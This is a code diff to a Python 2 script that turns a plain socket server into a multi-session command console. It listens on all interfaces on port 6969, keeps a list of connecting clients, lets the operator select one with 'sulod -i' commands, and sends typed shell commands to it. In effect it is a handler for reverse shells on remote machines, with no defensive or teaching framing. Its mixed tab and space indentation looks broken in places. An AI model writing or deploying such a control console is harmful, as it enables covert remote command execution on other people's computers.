@@ -1,7 +1,12 @@
-import socket, select, sys, Queue
+import socket, select, sys, Queue, string
+
+#Create data type for all connected clients
+class clientSock():
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	id = 0
 
 #initialize socket
-listenip = "192.168.254.105"
+listenip = "0.0.0.0"
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 server.setblocking(0)
@@ -9,32 +14,78 @@ server.bind((listenip, 6969))
 server.listen(5)
 
 #Create list of socket queues
-incoming = [server]
-outgoing =[]
-
+incoming = [server, sys.stdin]
+listclient = []
+cnt = 0;
+disSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+newsock = clientSock()
+sys.stdout.write("\nshell#")
+sys.stdout.flush()
 try:
   	# loop to accept all incoming socket.connect 
 	while incoming:
+		cmd =''
 		#wait for I/O from the OS
-		read, write, exception = select.select(incoming, outgoing, incoming)
-		for sock in read:
+		read, write, err = select.select(incoming, [], [])
+		for IO in read:
 			#if socket connection is read
-			if sock is server:
-				client, addr = sock.accept()
-				client.setblocking(0)
+			if IO is server:
+				disSock, addr = server.accept()
+				disSock.setblocking(0)
 				#add client socket to incoming and message queue
-				incoming.append(client)
+				newsock = clientSock()
+				newsock.sock = disSock
+				newsock.id = cnt
+				listclient.append(newsock)
+				incoming.append(disSock)
+				cnt += 1
+				sys.stdout.write("\n" + str(disSock.getpeername()) + "shell#")
+				sys.stdout.flush()
 			#if data is read
-			else:
-				data = sock.recv(4096)
-				#if data not empty
-				if (data):
-					print (data)
-		for sock in write:
-			sock.send("shell")
+			elif IO is sys.stdin:
+				cmd = sys.stdin.readline()
+				#lists all connected client
+				if cmd == 'sulod -l\n':
+					for listsock in listclient:
+						sys.stdout.write("\n" + str(listsock.id))
+				#exit
+				elif cmd == 'exit\n':
+					sys.exit()
+				#enter into client session
+				elif cmd.find("sulod -i") >= 0:
+					cmd = cmd.lstrip("sulod -i ")
+					#print (cmd)
+					for listsock in listclient:
+						if (str(listsock.id) == cmd.rstrip()):
+							print cmd
+							disSock = listsock.sock
+							newsock = listsock
+				#send command to client
+				else:
+					disSock.send(cmd)
+				
+				try:
+                                        sys.stdout.write("\n" + str(disSock.getpeername()) +"shell#")
+                                except:
+                                        sys.stdout.write("\nshell#")
 
-		for sock in exception:
+				sys.stdout.flush()
+			else:
+				data = disSock.recv(4096)
+				#if client is sending data
+				if (data):
+					sys.stdout.write("\n" + data)
+ 					sys.stdout.write("\n" + str(disSock.getpeername()) + "shell#")
+				#if client is disconnected
+				elif (not data):
+					incoming.remove(disSock)
+		                        listclient.remove(newsock)
+                		        disSock.close()
+					
+                                sys.stdout.flush()
+		for sock in err:
 			incoming.remove(sock)
+			listclient.remove(newsock)
 			sock.close()
 
 except Exception as e:
